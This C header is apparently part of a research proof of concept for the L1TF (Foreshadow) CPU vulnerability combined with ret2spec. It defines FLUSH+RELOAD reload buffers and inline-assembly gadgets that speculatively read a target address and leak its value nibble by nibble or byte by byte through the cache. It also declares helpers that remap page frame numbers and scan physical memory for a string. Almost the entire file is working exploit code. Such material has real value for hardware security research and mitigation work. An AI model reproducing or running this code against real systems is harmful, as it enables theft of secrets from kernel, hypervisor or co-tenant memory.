#pragma once
#include "constants.h"
#include "ret2spec.h"
#include <stddef.h>
#include <stdint.h>

// The reload buffer will be used to leak a byte at the time.
// However, instead of hving a 256 page-sized reload buffer,
// we only have a 32 page-sized buffer.
// Instead of leaking byte-for-byte, and thus needing a covert
// channel "resolution" of 2^8 = 256 pages per byte we want to leak,
// we can leak nibble-for-nibble. This requires just 2^4 = 16 pages
// per nibble per FLUSH+RELOAD iteration.
// The tradeoff is that we require a larger speculative window, and need
// some additional post processing to reconstruct the data.
#define AMOUNT_OF_OPTIONS_IN_NIBBLE 16
#define AMOUNT_OF_NIBBLES_PER_RELOAD 2
#define AMOUNT_OF_RELOAD_PAGES                                                 \
  (AMOUNT_OF_OPTIONS_IN_NIBBLE * AMOUNT_OF_NIBBLES_PER_RELOAD)
typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD]
                               [AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];

#define AMOUNT_OF_BYTE_OPTIONS 256
typedef uint8_t full_reload_buffer_t[AMOUNT_OF_BYTE_OPTIONS][PAGE_SIZE];

extern uint64_t reload_label_nibbles(void);
static inline __attribute__((always_inline)) void
asm_l1tf_leak_nibbles(void *leak_addr, reload_buffer_t reload_buffer) {
  asm volatile("xor %%rax, %%rax\n"
               "xor %%rbx, %%rbx\n"
               "movq (%[leak_addr]), %%rax\n"
               "movq %%rax, %%rbx\n"
               "and $0xf0, %%rax\n"
               "and $0x0f, %%rbx\n"
               "shl $0x8, %%rax\n"
               "shl $0xc, %%rbx\n"
               "movq (%[nibble0], %%rbx, 1), %%r8\n"
               "movq (%[nibble1], %%rax, 1), %%r8\n"
               /* "mfence\n" */
               /* "asm_l1tf_leak_nibbles_loop:\n" */
               /* "pause\n" */
               /* "jmp asm_l1tf_leak_nibbles_loop\n" */
               ".global reload_label_nibbles\n"
               "reload_label_nibbles:"

               ::[leak_addr] "r"(leak_addr),
               [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
               : "rax", "rbx", "r8");
}

extern uint64_t reload_label_full(void);
static inline __attribute__((always_inline)) void
asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
  asm volatile("xor %%rax, %%rax\n"
               "movq $0xC7DB70C9B1ABE849, %%r12\n"
               "movq $0x47DF1DF4CD7E16F1, %%r13\n"
               "leaq reload_label_full(%%rip), %%r14\n"
               "movq (%[leak_addr]), %%rax\n"
               "and $0xff, %%rax\n"
               "shl $0xc, %%rax\n"
               "prefetcht0 (%[reload_buffer], %%rax)\n"
               "mfence\n"
               "asm_l1tf_leak_full_loop:\n"
               "pause\n"
               "jmp asm_l1tf_leak_full_loop\n"
               "reload_label_full:"

               ::[leak_addr] "r"(leak_addr),
               [reload_buffer] "r"(reload_buffer)
               : "rax");
}

uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]);

typedef struct {
  void *leak;
  size_t original_pfn;
  size_t current_pfn;
} leak_addr_t;

leak_addr_t l1tf_leak_buffer_create();
void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr);
void l1tf_leak_buffer_free(leak_addr_t *leak);

void *l1tf_scan_physical_memory(size_t length, char needle[length],
                                size_t stride);
